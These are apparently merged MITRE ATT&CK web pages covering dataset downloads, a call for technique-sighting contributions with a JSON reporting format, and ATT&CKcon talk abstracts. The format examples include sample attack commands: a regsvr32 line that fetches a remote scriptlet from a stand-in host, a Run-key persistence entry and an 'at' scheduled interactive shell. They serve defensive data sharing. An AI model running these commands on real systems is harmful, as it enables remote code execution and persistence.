The ATT&CK dataset is available in STIX 2.0 and STIX 2.1. Other presentations of this dataset, including the ATT&CK Navigator and this website, are built from the STIX data. Learn more STIX is a machine-readable format providing access to the ATT&CK knowledge base. It is the most granular representation of the ATT&CK data, and all other representations are derived from the STIX dataset. Consider using ATT&CK in STIX if you: Have automated workflows that need to ingest ATT&CK data. Are a proficient Python user seeking to save time with automation or want to perform advanced queries. Want your workflows to keep up-to-date with the evolving knowledge base. Want to extend the ATT&CK dataset with custom content, and use this custom content with ATT&CK tools. The ATT&CK STIX representation is most easily manipulated in Python using the stix2 library. However, because STIX is represented in JSON, other programming languages can easily interact with the raw content. The ATT&CK STIX data can be retrieved from GitHub directly, or accessed via the official ATT&CK TAXII\u2122 server. Trusted Automated Exchange of Intelligence Information (TAXII) is an application protocol for exchanging CTI over HTTPS. The ATT&CK TAXII server provides API access to the ATT&CK STIX knowledge base. Learn more about accessing the TAXII server here. ATT&CK in STIX 2.1 Visit the repository Read the docs ATT&CK in STIX 2.0 Visit the repository Read the docs Learn about STIX Learn about TAXII ATT&CK in Excel Excel spreadsheets representing the ATT&CK dataset. These spreadsheets are built from the STIX dataset and provide a more human-accessible view into the knowledge base while also supporting rudimentary querying/filtering capabilities. Learn more Consider using ATT&CK in Excel if you: Want to quickly sort, filter and query the dataset in a familiar UI. Want to explore the contents of the dataset without having to navigate around the ATT&CK website. Are not comfortable enough in Python or other programming languages to work with the STIX representation. The Excel representation of the ATT&CK dataset includes both master spreadsheets, containing all object types, and individual spreadsheets for each object type. The individual type spreadsheets break out relationships (e.g procedure examples connecting groups to techniques) into separate sheets by relationship type, while the master spreadsheet includes all relationship types in a single sheet. Otherwise the representation is identical. A citations sheet can be used to look up the in-text citations which appear in some fields. For domains that include multiple matrices, such as Mobile ATT&CK, each matrix gets its own named sheet. Unlike the STIX dataset, objects that have been revoked or deprecated are not included in the spreadsheets. The source code for the STIX to Excel converter can be found in our mitreattack-python pip module. enterprise-attack-v13.1.xlsx enterprise-attack-v13.1-matrices.xlsx enterprise-attack-v13.1-mitigations.xlsx enterprise-attack-v13.1-relationships.xlsx enterprise-attack-v13.1-software.xlsx enterprise-attack-v13.1-groups.xlsx enterprise-attack-v13.1-tactics.xlsx enterprise-attack-v13.1-techniques.xlsx enterprise-attack-v13.1-datasources.xlsx enterprise-attack-v13.1-campaigns.xlsx mobile-attack-v13.1.xlsx mobile-attack-v13.1-matrices.xlsx mobile-attack-v13.1-mitigations.xlsx mobile-attack-v13.1-relationships.xlsx mobile-attack-v13.1-software.xlsx mobile-attack-v13.1-groups.xlsx mobile-attack-v13.1-tactics.xlsx mobile-attack-v13.1-techniques.xlsx mobile-attack-v13.1-campaigns.xlsx ics-attack-v13.1.xlsx ics-attack-v13.1-matrices.xlsx ics-attack-v13.1-mitigations.xlsx ics-attack-v13.1-relationships.xlsx ics-attack-v13.1-software.xlsx ics-attack-v13.1-groups.xlsx ics-attack-v13.1-tactics.xlsx ics-attack-v13.1-techniques.xlsx ics-attack-v13.1-datasources.xlsx ics-attack-v13.1-campaigns.xlsx Tools for working with ATT&CK ATT&CK Navigator The ATT&CK Navigator is a web-based tool for annotating and exploring ATT&CK matrices.

You can share to help make the whole community better! Background Though the open-source reporting that is integrated into ATT&CK provides important information about which techniques are used by which adversaries, it is subject to various biases: Novelty bias: new and interesting techniques or existing techniques used by new actors get reported, while run of the mill techniques used over and over again do not. Visibility bias: organizations publishing intel reports have visibility of certain techniques and not others. For incident responders, responding to a fire in progress vice sifting through the ashes to find out what happened will give a different view as well. Not all techniques can be viewed the same way during or after an incident. Producer bias: some organizations publish much more reporting, and the types of customers or visibility they have may not reflect the broader industry/world. Victim bias: certain types of victim organizations may be more likely to report (or be reported on) than others. Availability bias: techniques that are easily called to mind are likely reported more frequently, as report authors think to include them more often. This doesn't mean that information contained in threat reports is useless -- obviously, it's very useful towards telling us what's being used, by who, and how. It\u2019s the entire foundation of the ATT&CK knowledge base. But, what it does mean is that using it as raw data to understand the prevalence of techniques or how they\u2019re leveraged over time and across industries might give deceiving answers. This can be particularly important if you\u2019re prioritizing defensive operations \u2013 you want to focus defenses on techniques that are used more often by more adversaries, not just those that are new and interesting or come to mind more easily. To help counter this and extend ATT&CK\u2019s foundation as a data-driven knowledge base, the team will begin soliciting contributions of raw sightings of ATT&CK techniques. We hope that this data will help us make the ATT&CK knowledge base itself better as well as make it easier for consumers to understand how techniques are used. Types of Sightings ATT&CK sightings data collection will take three forms, each of which provides a different insight into the usage of techniques. Direct sighting of a technique The ATT&CK team is most interested in data from actual sightings of techniques being executed in the course of an attack. In other words, during an event investigation data is collected which shows that one or more ATT&CK techniques were actually used by the adversary on (or targeted at) the victim infrastructure. Cases where multiple techniques were detected as part of a single attack should be reported as a single sighting with multiple techniques listed. Example: If mimikatz were used on a victim machine to dump credentials and that was observed by an EDR tool, it would constitute a direct sighting of Credential Dumping. This might take the form of a sighting of a process accessing lsass.exe memory, for example. Direct sightings of techniques are the most valuable type of sighting because they tell you, at a ground-truth level, that the adversary relied on a specific technique to carry out an attack. Direct technique sightings are reported using the direct-technique-sighting format. Direct sighting of malicious software In some cases, a technique might not be directly observed (or even be observable given sensing capability) but the presence of a piece of malicious software on the machine can give a strong hint that it was used. In other cases, software to carry out a technique might be blocked at the perimeter \u2013 in those cases, it indicates that the adversary might have wanted to use a certain technique but wasn't able to. Note: There is of course a grey area when talking about malicious software. What we mean is tools that can be used to carry out malicious attacks, including things commonly called \"penetration test\" software as well as those that are clearly malicious. On the other hand, we don't mean built-in OS functionality. So please do send us sightings of things like metasploit or cobalt strike, but do not send us sightings of powershell or the net command. Those latter items should be reported as a direct sighting of a technique (e.g., T1086). Example: The presence of mimikatz.exe on a machine without evidence that it was actually run to dump credentials \u2013 or, mimikatz.exe being blocked at the perimeter or by antimalware -- would constitute a direct sighting of mimikatz. From that, you can assume some attempt to perform credential access techniques available in mimikatz -- but because they were not directly observed, you can't be certain exactly what did or could have happened. Note that direct software sightings are most useful for software already contained in ATT&CK that directly enables one or more ATT&CK techniques. Direct software sightings are reported using the direct-software-sighting format. Indirect sightings of malicious software In other cases, threat intelligence platforms or ISACs might have data feeds that indirectly demonstrate the fact that a piece of software is being used, without directly observing it. Example: A file hash for mimikatz.exe shared to an ISAC or threat intel platform would be an indirect sighting of mimikatz.exe. As with a direct sighting of malware, this does provide some indication (though weaker) that an adversary was interested in performing credential access. Note that, as above, indirect software sightings are most useful for software already contained in ATT&CK that directly enables one or more ATT&CK techniques. Additionally, indirect sightings should only be reported when there is a reasonable presumption that they haven't been reported by another party. In other words, don't write a scraper for some TIP and send sightings for all IOCs in that TIP unless you own or operate the TIP (if you do, please send us the sightings!). Indirect software sightings are reported using the indirect-software-sighting format. Data Usage In general, the ATT&CK team believes that richer data collection of more raw data will allow us to better understand how techniques are used in practice. You could ask questions like: Which techniques are used more often? Do the techniques used differ by sector? Do the techniques used differ by actor type (APT vs. FIN)? How does usage change over time? Though the eventual goal of this program is to provide useful data to the community, in order to tread carefully, at this initial piloting stage we would keep the data internal to the MITRE ATT&CK team and would protect it by an NDA. The goals of this would be to: Prove the concept works and that quality data can be collected Understand the differences between the types of data that are contributed, and how they can still be aggregated to provide a consistent picture Work with submitters to identify how they want data to eventually be published (i.e., how it\u2019s attributed, how data from different submitters is combined, how much it has to be aggregated, etc.) Iron out any kinks in the collection process (our data format, etc.) After those initial steps are completed (we expect a few months, but it could be longer) and the participants can agree on how they want the data published we\u2019ll begin initial operations. At that phase, we\u2019ll continue to work closely with all submitters to ensure that we get the data we\u2019re expecting. Over time, we can transition to more automated collection and processing. Note that this is not an operational threat sharing mechanism and we do not intend to ever directly share even anonymized raw sightings data. Contribute Have data that fits into one of these buckets? Contact us at attack@mitre.org to get started! In particular we hope that EDR vendors, intel reporters, TIP vendors, ISACs, and end user organizations can help the community by providing this data.

For example: Command Line: \"process.create\": {\"command_line\": \"regsvr32.exe /i:hxxp://lolbad.com scrobj.dll\"} Registry Key: \"registry.add\": { \"hive\": \"HKEY_CURRENT_USER\", \"key\": \"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"value\": \"bad.exe\" } More complete examples are also below. If something isn't expressible in the CAR data model as-is, just make up and object and action that makes sense to you and we'll figure it out. Examples Simple Technique Sighting A managed service provider monitors sensor data across its customer base. During that monitoring, an analytic flags a Sysmon process event that indicates a scheduled task is being created using \"at\". { \"id\": \"DT-1234\", \"sightingType\": \"direct-technique-sighting\", \"startTime\": \"2019-01-01T08:12:00Z\", \"endTime\": \"2019-01-01T08:12:00Z\", \"detectionType\": \"human-validated\", \"techniques\": [ { \"techniqueID\": \"T1088\", \"startTime\": \"2019-01-01T08:12:00Z\", \"endTime\": \"2019-01-01T08:12:00Z\", \"platform\": \"Windows 10\", \"rawData\": [ \"process.create\": {\"command_line\": \"at 13:30 /interactive cmd\"} ] } ] } Technique Sighting with Attribution An ISAC collects, anonymizes, and redistributes sightings from its members.

Intelligence Failures of Lincolns Top Spies: What CTI Analysts Can Learn From the Civil War (Selena Larson, Proofpoint) ATT&CKcon 3.0 Keynote. Read the accompanying blog post as well. video slides 2. State of the ATT&CK (Adam Pennington, MITRE ATT&CK) video slides 3. Mapping to MITRE ATT&CK: Enhancing Operations Through the Tracking of Interactive Intrusion Campaigns.pdf (Jason Wood, Justin Swisher, CrowdStrike) When it comes to understanding and tracking intrusion tradecraft, security teams must have the tools and processes that allow the mapping of hands-on adversary tradecraft. Doing this enables your team to both understand the adversaries and attacks you currently see and observe how these adversaries and attacks evolve over time. This session will explore how a threat hunting team uses MITRE ATT&CK to understand and categorize adversary activity. The team will demonstrate how threat hunters map ATT&CK TTPs by showcasing a recent interactive intrusion against a Linux endpoint and how the framework allowed for granular tracking of tradecraft and enhanced security operations. They will also take a look into the changes in the Linux activity they have observed over time, using the ATT&CK navigator to compare and contrast technique usage. This session will provide insights into how we use MITRE ATT&CK as a powerful resource to track intrusion tradecraft, identify adversary trends, and prepare for attacks of the future. video slides 4. Knowledge for the masses: Storytelling with ATT&CK (Ismael Valenzuela, Jose Luis Sanchez Martinez, Trellix) The Trellix team believes that creating and sharing compelling stories about cyber threats -with ATT&CK- is a powerful way for raising awareness and enabling actionability against cyber threats.In this talk the team will share their experiences leveraging ATT&CK to disseminate Threat knowledge to different audiences (Software Development teams, Managers, Threat detection engineers, Threat hunters, Cyber Threat Analysts, Support Engineers, upper management, etc.).They will show concrete examples and representations created with ATT&CK to describe the threats at different levels, including: 1) an Attack Path graph that shows the overall flow of the attack; 2) Tactic-specific TTP summary tables and graphs; 3) very detailed, step-by-step description of the attacker's behaviors. video slides 5. Tracking Noisy Behavior and Risk-Based Alerting with ATT&CK (Haylee Mills, Splunk) Having ATT&CK to identify threats, prioritize data sources, and improve security posture has been a huge step forward for our industry, but how do we actualize those insights for better detection and alerting? By shifting to observations of behavior over one-to-one direct alerts, noisy datasets become valuable treasure troves with ATT&CK metadata. Additionally, we can begin to look at detection and threat hunting on behavior instead of users or systems. In this presentation, Haylee will discuss the shift in mindset and the nuts and bolts of detections that leverage this metadata in Splunk, but the concept can be applied with custom tools to any valuable security dataset. video slides 6. ATT&CK Updates- Defensive ATT&CK (Lex Crumpton, MITRE ATT&CK) video slides 7. Would you Rather Have Telemetry into 2 Attacks or 20? An Insight Into Highly Valued Data Sources (Jonny Johnson, Olaf Hartong, Red Canary and FalconForce) As defenders, we often find ourselves wanting \"more\" data. But why? Will this new data provide a lot of value or is it for a very niche circumstance? How many attacks does it apply to? Are we leveraging previous data sources to their full capability? Within this talk, Olaf and Jonny will walk through different data sources they leverage more than most when analyzing data within environments, why they do, and what these data sources do and can provide in terms of value to a defender. video slides 8. ATT&CK Metaverse - Exploring the Limitations of Applying ATT&CK (Gert-Jan Bruggink, Venation) Since it's inception in 2015, the ATT&CK framework has achieved widespread adoption, with recent studies suggesting over 80 percent of companies using the framework for cyber security. Over the last seven years, a variety of use cases has been explored with different measures of success. In this presentation, Gert-Jan will explore applying the ATT&CK framework in scenario-based defense. When adopting a scenario approach, security teams collaborate to fuse their understanding of certain situations into scenarios. For example, addressing different hypotheses that can be explained to leadership and specialist teams alike. This approach requires more than \"just\" breaking down everything into tactics, techniques, and procedures. Some stakeholders might not understand that. For example, some might want to tell a good story about adversaries while others want to translate their understanding of intrusions into a sequential pattern. The objective of this talk is to explore how the granularity of the framework supports creation of scenarios, the limitations in the current approach to ATT&CK when building scenarios across different stakeholders, and addressing potential areas the \"language of ATT&CK\" can evolve towards over the next 5 years. video slides 9. It's just a jump to the left (of boom): Prioritizing detection implementation with intelligence and ATT&CK (Lindsay Kaye, Scott Small, Recorded Future) Many organizations ask: \"Where do I start, and where do I go next\" when prioritizing implementation of behavior-based detections? We often hear \"use threat intelligence!\" but your goals must be qualified and quantified in order to properly prioritize the most relevant TTPs. A wealth of open-sourced, ATT&CK-mapped resources now exists, giving security teams greater access to both detections and red team tests they can implement, but intelligence (also aligned with ATT&CK), is essential to provide necessary context to ensure that detection efforts are focused effectively.This session will discuss a new approach to the prioritization challenge, starting with an analysis of the current defensive landscape, as measured by ATT&CK coverage for more than a dozen detection repositories and technologies, and guidance on sourcing TTP intelligence. The team will then show how real-world defensive strategies can be strengthened by encompassing a full-spectrum view of threat detection, including the implementation of YARA, Sigma, and Snort in security appliances. Critically, alignment of both intelligence and defenses with ATT&CK enables defenders to move the focus of detection efforts to indications of malicious behavior before the final payload is deployed, where controls are most effective at preventing serious damage to the organization. video slides 10. ATT&CK Updates- Campaigns (Matt Malone, MITRE ATT&CK) video slides 11. Landing on Jupyter: The transformative power of data-driven storytelling for security operations (Jose Barajas, Stephan Chenette, AttackIQ) Every cybersecurity leader wants visibility into the health of their security program. Yet teams suffer with disparate data streams - CTI teams and the SOC often use separate Excel spreadsheets, an anachronistic practice - and silos constrain their ability to operate effectively. Enter the Jupyter notebook, an open-source computational notebook that researchers use to combine code, computing output, text, and media into a single interface. In this talk, we share three stories of how organizations use Jupyter notebooks to align ATT&CK-based attack flows to the security program, generating data about detection and prevention failures, defensive gaps, and longitudinal performance. By using Jupyter notebooks in this way, teams can better leverage ATT&CK for security effectiveness. It becomes less of a bingo card and more of a strategic tool for understanding the health of the program against big tactics (I.e., lateral movement), defensive gaps (I.e., micro-segmentation), and the team's performance. video slides 12. The ATT&CK Philharmonic (Ivan Ninichuck, Andy Shepard, Siemplify) The MITRE ATT&CK framework has improved many areas within the infosec workflow. But many of these select areas are those that are relatively isolated from the tactical operations faced every day by lower or mid-tier analysts. When faced with alert fatigue and an ever-growing number of data sources, the impact of ATT&CK can become esoteric to non-existent. In this presentation experts from Siemplify propose the problem be looked at like an orchestra with its dozens of instrument types. Without a conductor to guide each section there would only be noise, but with the conductor leading, beautiful symphonies can now be played. The Siemplify team plan to show how a SOAR platform can be that conductor using the ATT&CK framework as its sheet music, and turn the constant noise into a threat intel driven security program. video slides 13. Automating the mundanity of technique IDs with ATT&CK Detections Collector (Marcus LaFerrera, Ryan Kovar, Splunk) Since the release of MITRE ATT&CK, vendors and governmental bodies have begun mapping their security blogs, whitepapers, and threat intel reports to ATT&CK TTPs, which is incredible! Vendors have then begun mapping their detections to those mapped TTPs, which is even more awesome! What is not awesome is dissecting a piece of prose for all of the specific embedded ATT&CK technique IDs and then mapping them to your detections to determine coverage. Over the last year, the team at Splunk has spent more time doing this than they would like to admit, so they wrote a tool to do it for them and want to share it with the world. Join the Splunk team as they tell the world about ATT&CK Detections Collector (ADC). ADC is an open-source python tool that will allow you to extract MITRE technique IDs from a third-party URLs and output them into a file. If you use Splunk, the team even maps them to their existing (previously mapped) detection corpus. They even added the ability to export them into a navigator json for fun, profit, or (at least) better visualization! video slides 14. The ATT&CK Latin American APT Playbook (Santiago Pontiroli, Dmitry Bestuzhev, Kaspersky) Financially motivated cyber-attacks thrive in emerging Latin American markets. However, there's room for locally grown threat actors operating in the cyber espionage field as well. During the last decade, this includes but is not limited to Blind Eagle, Puppeteer, Machete, Poseidon, and others. We also saw foreign operations targeting specific assets in Latin America, still connected to certain regional sources.Since the threat actors' origin, culture, and language is often different, it's not uncommon for tactics, techniques, and procedures (TTPs) to present marked differences. As a result of our regional expertise and experience, we created MITRE's ATT&CK play-by-play mappings to help other analysts understand regional actors. If you are interested in threat intelligence and what's going on in Latin America, this presentation is for you. Our work is based only on real-world attackers and their operations, including those not publicly known, such as COVID-19 Machete's targeted campaign. video slides 15. Mapping ATT&CK Techniques to ENGAGE Activities (David Barroso, CounterCraft) When an adversary engages in a specific behavior, they are vulnerable to expose an unintended weakness. By looking at each ATT&CK technique, we can examine the weaknesses revealed and identify an engagement activity or activities to exploit this weakness.During the presentation we will see some real examples of how we can use different ATT&CK techniques in order to plan different adversary engagement activities. video slides 16. When Insiders ATT&CK! (Matt Snyder, VMWare) Insider threats are some of the most treacherous and every organization is susceptible: it's estimated that theft of Intellectual Property alone exceeds $600 billion a year. Armed with intimate knowledge of your organization and masked as legitimate business, often these attacks go unnoticed until it's too late and the damage is done. To make matters worse, threat actors are now trying to lure employees with the promise of large paydays to help carry out attacks. These advanced attacks require advanced solutions, and we are going to demonstrate how we are using the MITRE ATT&CK framework to proactively combat these threats. Armed with these tactics and techniques, we show you how to build intelligent detections to help secure even the toughest of environments. video slides 17. ATT&CK Updates- ATT&CK for ICS (Otis Alexander, MITRE ATT&CK) video slides 18. Exploring how Students Map Social Engineering Techniques to the ATT&CK Framework During a Real-Time Cybersecurity Exercise (Aunshul Rege, Katorah Williams) Social engineering (SE) is a technique used by cybercriminals to psychologically manipulate individuals into disclosing sensitive information and providing unauthorized access. Penetration testers are tasked with simulating targeted attacks on a company's system to determine any weaknesses in their environment. The 2021 Summer SE Pen Test Competition allowed students to experience SE pen testing in a safe and ethical way. Student teams were \"hired\" to conduct a SE pen test on the CARE Lab (run by the authors) and their employees (the authors themselves)! Teams had to use OSINT, phishing, and vishing in real-time to target the lab, develop attack playbooks, and map the techniques to the ATT&CK framework. This talk shares the application of ATT&CK in cybersecurity education. Specifically, it (i) focuses on how students map their SE attack playbooks to the ATT&CK framework, (ii) compares/contrasts SE techniques across various student groups: 6 graduate teams, 9 undergraduate teams, and 1 high school team, and (iii) how ATT&CK can be used for SE. video slides 19. ATT&CKing the Red/Blue Divide (Fred Frey, Jonathan Mulholland, SnapAttack) Atomic Red Team and Sigma are the largest open-source attack simulation and analytic projects. Many organizations utilize one or both internally for security controls validation or supplementing their detections and alerts. Building on the work from these two great communities, we smashed (scientific-term) the attacks and analytics together and applied data science to analyze the results. We'll describe our methodology and testing framework, show the real-world MITRE ATT&CK coverage and gaps, discuss our algorithms for calculating analytic similarity, identifying log sources for a technique, and determining the best analytics to deploy that maximizes ATT&CK coverage. This project aims to: - Bring a measurable testing rigor to community analytics to improve adoption - Test every analytic against every attack, validating the true positive detection - Understand the log sources required to detect specific attack techniques - Apply data science to identify analytic similarity (reduce community duplication) - Identify gaps between the projects' analytics without attack simulations; attack simulations without detections; missing or incorrect MITRE ATT&CK labels, etc - Automate the process so insights can stay up to date with new attack/analytic contributions over time - Share our analysis back to the community to improve these projects video slides 20. ATT&CK Updates- ATT&CK for mac/Linux (Cat Self, MITRE ATT&CK) video slides 21. What is ATT&CK coverage, anyway? Breadth and depth analysis with Atomic Red Team (Brian Donohue, Red Canary) This presentation will highlight the Atomic Red Team project's efforts to define and increase the test coverage of MITRE ATT&CK techniques. We'll describe the challenges we encountered in defining what \"coverage\" means in the context of an ATT&CK-based framework, and how to use that definition to improve an open source project that's used by a diverse audience of practitioners to satisfy an equally diverse array of needs. The audience will learn how the Atomic Red Team maintainers standardize and categorize atomic tests, perform gap analysis to achieve deep technique-level coverage and broad matrix-level coverage, and quickly fill those gaps with new tests. video slides 22. ATT&CKING Containers in The Cloud (Jared Stroud, Lacework) Adversaries target common cloud misconfigurations in container-focused workflows for initial access. Whether this is Docker or Kubernetes environments, Lacework Labs has identified adversaries attempting to deploy malicious container images (T1610) , mine Cryptocurrency (T1496), and deploy C2 agents. Defenders new to the container space may be unaware of the built-in capabilities popular container runtime engines have that can help defend against rogue containers being deployed into their environment. Attendees will walk away with an understanding of what these attack patterns look like based on honeypot data Lacework has gathered over the past year, as well as techniques on how to defend their own container focused workloads. video slides 23. Threat Modelling - It's not just for developers (Tim Wadhwa-Brown, Cisco) The purpose of this session will be to look at how you can take public information about threat actors, vulnerabilities, and incidents and use them to build better defenses, utilizing ATT&CK along the way to align your security organization to the people and assets that matter.Stories are critical to how humans learn, so this session will leverage a story book approach to give the audience some ideas on approaches they could use. Tim will take the audience through 3 real world examples where he has leveraged ATT&CK to drive operational improvement. The premise of each story will be real, although some of the details will be apocryphal to protect the innocent.One story will focus on defending a network, one will look at adversary detection, while the final one will look at responding to an active attack and in each case, Tim will guide the audience to think about the kinds of data sources that ATT&CK tracks, that they might call upon to achieve a successful outcome. video slides 24.

Welcome (Katie Nickels, MITRE) ATT&CK Threat Intelligence Lead Katie Nickels welcomes attendees and introduces the members of the ATT&CK team. video (no slides) 2. The Friends We Made Along the Way, Keynote Address (Toni Gidwani, Google) In the keynote from ATT&CKcon 2.0, Toni Gidwani from Google\u2019s Threat Analysis Group presents \"The Friends We Made Along the Way.\" The talk focuses on the purpose of intelligence, to create a decision advantage, and the partnerships that are necessary to achieve that purpose. video slides 3. State of the ATT&CK (Blake Strom, MITRE) MITRE ATT&CK Lead Blake Strom updates the community on what\u2019s new in ATT&CK since ATT&CKcon 2018 and some of what to expect in the coming year. This talk includes details on ATT&CK for Cloud, the new Impact Tactic, structured mitigations, and the upcoming shift to sub-techniques. video slides 4. Using Threat Intelligence to Focus ATT&CK Activities (David Westin and Andy Kettell, Nationwide) In October 2018, Nationwide began its MITRE ATT&CK journey. Nationwide looked at a number of different approaches to getting started, but it wasn\u2019t until they prioritized efforts based on threat actors likely to target the finance/insurance industry that things started to click. Ultimately, Nationwide focused on 27 high concern threat actors targeting their industry, reducing the overall number of techniques from 240+ to 91. With this manageable chunk of techniques, Nationwide was able to test, analyze, and provide recommendations for improving its detection and mitigation capabilities. Nationwide is continuing to keep threat actor focus at the heart of its ATT&CK efforts, leading to prioritization of remediation actions, integration into penetration testing, and selection of security tools. video slides 5. Prioritizing ATT&CK Informed Defenses the CIS Way (Philippe Langlois, Verizon DBIR; Joshua Franklin, Center for Internet Security) In a world of limited resources, organizations have to be strategic and meticulous in their planning and selection of security controls and the MITRE ATT&CK model has become an important piece for categorizing and understanding adversary techniques and contextualizing our own defenses. However, there still underlies a difficult question, where should organizations start and how should they prioritize their cybersecurity efforts? Join CIS as we explore our attempt to tackle this problem through the use of our community, content and real-world threat data collected as part of the Multi-State Information Sharing and Analysis Center (MS-ISAC). Participants should look forward to learning how to prioritize their security efforts and leverage the process for their own data and threats. video slides 6. Alertable Techniques for Linux using ATT&CK (Tony Lambert, Red Canary) Community members continually ask, should I have detection capabilities across every technique in ATT&CK? This question inevitably leads to the same conclusion that not every technique is alertable and not all of them provide the same value for immediate detection. In this session we\u2019ll discuss the concept of alertable detections using Linux ATT&CK techniques as a case study. We\u2019ll introduce decision criteria we\u2019ve learned through experience to illustrate the challenges, and we\u2019ll recommend specific techniques that work well with an alert-driven workflow. video slides 7. ATT&CK Updates \u2013 TRAM (Jackie Lasky and Sarah Yoder, MITRE) Updates from the ATT&CK Team's very own Jackie Lasky and Sarah Yoder covering Threat Report ATT&CK Mapping (TRAM). video slides 8. Raiders of the MITRE Framework: How to Build Your Own Threat Library (Valentina Palacin and Ruth Esmeralda Barbacil, Deloitte) It's the year 2019 and the internet has been around long enough to be filled with what seems to be \"ancient\" data. Digging through, classifying and analyzing everything sometimes makes you feel a lot like Indiana Jones searching for the right clues in a moving puzzle. But how could you move through the caves without getting buried under piles of data rubble? How might anyone revisit and study the data from the past to transform it into actionable information for the present? In this talk we are going to show you how a threat intel Indiana Jones analyst should tackle these issues in order to find the treasure of the Threat Library. We will show you how we used the MITRE ATT&CK Framework as our book of secrets for turning dusty old Internet artifacts into a library of actionable Threat Intelligence. video slides 9. Climbing the ATT&CK Ladder: How a Threat Hunting Team Has Upgraded Its Use of ATT&CK (Karl Scheuerman and Piotr Wojtyla, CrowdStrike) CrowdStrike\u2019s OverWatch threat hunting team has continued to mature in its use of the ATT&CK framework to categorize and track targeted adversary behavior. This presentation will build on our talk from last year\u2019s ATT&CKcon, where we shared tactic/technique trends and unique examples observed in the wild. Since that time, we have taken a number of steps to enhance our usage of ATT&CK, including: Mapping of hunting leads to ATT&CK techniques Based on that mapping, auto-tagging techniques used in any given intrusion observed in our data set For that intrusion, automatically extracting process data to easily create tables of TTP details (\u201cATT&CK Sightings\u201d) Supplementing automated ATT&CK technique tagging by human analyst reviews Leveraging MISP\u2019s API to build ATT&CK heat maps with an array of filters on demand By using practices like those outlined above, we have been able to continue building what is likely the most comprehensive and detailed library of targeted intrusion data from the wild that is mapped to ATT&CK. As such, the presentation will also share significant trends and techniques from the intrusions we\u2019ve analyzed over the past year. video (no slides) 10. From Susceptible to ATT&CK: A Threat Hunting Story (Chris Thayer, Mastercard) The story of one man's crusade to convince the Senior Management of a fortune 500 company that security resources were needed beyond the perimeter, and the role ATT&CK played in those decisions. This talk documents the creation and persuasion required to create a successful threat hunting program at an enterprise level, and how the Mitre ATT&CK framework made this possible for one investigator, in his spare time, to prove the program's worth to senior management within 1 year of creation. video slides 11.

Zeek-based ATT&CK Metrics & Gap Analysis (Allan Thomson, LookingGlass Cyber Solutions) Today many organizations are using Bro (newly named Zeek) for network security monitor as it provides a powerful network analysis framework. This presentation will describe how to leverage Zeek to report on ATT&CK TTPs, raw events and other detectable activities. Key take-aways include how to report on sightings and occurrences of ATT&CK TTPs and events providing both metrics and gap analysis to inform security operations teams on where their defense may require improvement. video slides 13. attckr: A Toolkit for Analysis & Visualization of ATT&CK Incident Data for Service Providers & Organizations (Bob Rudis, Rapid7) The ATT&CK framework provides a standardized way for organizations to record and share attacker techniques used at each stage in attacker campaigns. Having and sharing this discrete, normalized attacker behavior is great, but these normalized bundles of incident events can also be used to identify areas of improvement in both incident response teams as well as by vendors who provide tools/solutions to triage and manage incidents. This talk will introduce {attckr}: an R package and application that provides programmatic, command-line, and interactive tools to analyze and visualize incident ATT&CK metrics. Attendees will see real-life (i.e. using real, anonymized incident data) examples of how to look across an ATT&CK incident corpus to identify trends (or outliers), support the development of ATT&CK incident baseline metrics, and develop reports and visualizations to assist in communicating operational performance, threat event frequency & type distributions for risk analysis, and identification of strengths and weaknesses in detection capability. video slides 14. MITRE ATT&CK Assessment from a Data Perspective (Olaf Hartong, Deloitte) MITRE ATT&CK has quickly become the industry standard for referencing techniques. All though the framework is a great and valuable asset it is still lacking actionable detail on may levels to most people. I've bridged that gap by building a relatively simple assessment toolkit to visualize your potential coverage from the data already present in your environment, your mitigative measures and your detection content. The toolkit will help you focus your efforts based on your data and your goal. video slides 15. Threat-Informed Defense: Where do we go from here? (Richard Struse, MITRE) Richard Struse explores the concept of a threat-informed defense and talks about ways of moving the cyber security community forward. video slides 16. AMITT: ATT&CK-based Standards for Misinformation Threat Sharing (Sara-Jayne Terp and John Gray, Credibility Coalition MisinfoSec Working Group) State actors, private influence operators and grassroots groups are exploiting the openness and reach of the Internet to manipulate populations at a distance. They are extending a decades-long struggle for \u201chearts and minds\u201d via propaganda, influence operations and information warfare, often in the form of coordinated incidents that are part of longer-timescale narrative-based campaigns. The Credibility Coalition is an interdisciplinary community committed to addressing the proliferation and amplification of misinformation online, through transparent and collaborative research. Its MisinfoSec working group develops information security-based standards to promote a more formal and rigorous treatment of 1) detecting misinformation-based attacks and 2) devising methods to protect against misinformation-based attacks. Specifically, we have adapted and extended frameworks used to describe information security incidents, for use in ISACs, ISAOs and other groups sharing misinformation threats and responses. In this talk, we discuss misinformation and why stage-based frameworks like ATT&CK are appropriate for it. We describe the AMITT (Adversarial Misinformation and Influence Tactics and Techniques) misinformation response framework and its roots in and deliberate compatibility with ATT&CK, its creation, relationships with other models, its components (including ways, means, and ends to achieve influence goals) and potential uses. video slides 17. Flashback with ATT&CK: Exploring Malware History with ATT&CK (2003-2018) (Kris Oosthoek, Delft University of Technology) Attackers keep innovating their TTPs to circumvent established defenses, so gaining insight into attacker innovation is fundamental. Our Twitter feeds are saturated with helpful reports daily, but how does this relate to trends and developments within the threat ecosystem as a whole? Take a step back, relax and get an ATT&CK-based overview of 15 years TTP evolution to inform your defense. This presentation will discuss ATT&CK techniques found in 950+ unique Windows malware families as part of an academic research project. With the malware harvested from an unbiased and reputable source, a representative view on 15 years of evolution in the malware field is ensured. For each ATT&CK tactic, the talk provides insight into trends and shifts in real-world adversary behavior. It will also highlight how a malware analysis automation pipeline can introduce biases into your CTI and based on that, best practices on how ATT&CK can be used to ensure CTI accuracy. This entertaining presentation provides practical takeaways that inform and help prioritize your threat defense. video slides 18. Tell Tall Tales With ATT&CK! (James Lerud, Titania Solutions Group) Once upon a time there was a security expert with all kinds of ATT&CK data. There were Atomic tests, breach simulations, and metrics abound! Our hero knew he could mold the data to illustrate a story of triumph. He would deliver magnificent slides and graphs with color and shape that, even the dull c-suite would know he was great. This presentation will teach the audience how to torture ATT&CK data until it confesses. Manipulation of ordinal scales, dirty data, playing into biases, nothing is off limits if it makes us look good. Follow the advice here and you will be ready to tell tall tales with ATT&CK\u2026 or for the true hearted tell boring realistic stories. video slides 19.

